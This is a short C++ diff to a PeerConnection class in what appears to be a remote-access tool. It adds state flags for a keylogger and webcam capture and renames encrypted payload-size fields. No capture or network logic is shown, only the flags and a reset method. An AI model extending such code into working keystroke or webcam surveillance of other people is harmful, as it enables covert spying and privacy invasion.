@@ -26,6 +26,22 @@
 const int BufferSize = 4096;
 
 class PeerConnection {
+
+    //shared for gui data etc
+    struct FunctionalityStruct {
+        int webcamDurationMs = 2000;
+        std::string rawText = "";
+        bool isKeyloggerActive = false;
+        bool isWebcamActive = false;
+
+        void reset() {
+            webcamDurationMs = 2000;
+            rawText = "";
+            isKeyloggerActive = false;
+            isWebcamActive = false;
+        }
+    };
+
 protected:
     std::atomic<int> socketfile{-1};
     std::atomic<bool> active{false};
@@ -34,7 +50,7 @@ protected:
     std::chrono::system_clock::time_point connectionTime;
     
     std::vector<uint8_t> receiveBuffer;
-    int remainingDataSize{0};   
+    int remainingPayloadSize{0}, writtenPayloadSize{0};
     std::array<uint8_t, 12> currentNonce;
     // std::mutex socketMutex;
 
@@ -54,6 +70,7 @@ public:
     }
 
     CryptHandler crypt;
+    FunctionalityStruct funcStruct;
 
     bool isActive() const;
     std::string getPeerIp() const;
